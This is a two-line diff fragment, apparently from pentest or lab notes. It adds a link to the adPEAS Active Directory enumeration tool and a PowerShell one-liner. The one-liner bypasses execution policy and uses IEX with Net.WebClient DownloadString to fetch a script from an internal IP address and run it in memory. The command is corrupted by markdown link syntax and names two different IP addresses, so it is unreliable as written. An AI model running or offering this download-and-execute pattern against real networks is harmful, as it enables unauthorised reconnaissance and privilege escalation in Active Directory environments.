@@ -1,0 +1,2 @@
+<https://github.com/61106960/adPEAS>
+powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('[http://10.8.24.10/adPEAS.ps1');Invoke-adPEAS](http://192.168.119.208/adPEAS.ps1');Invoke-adPEAS)
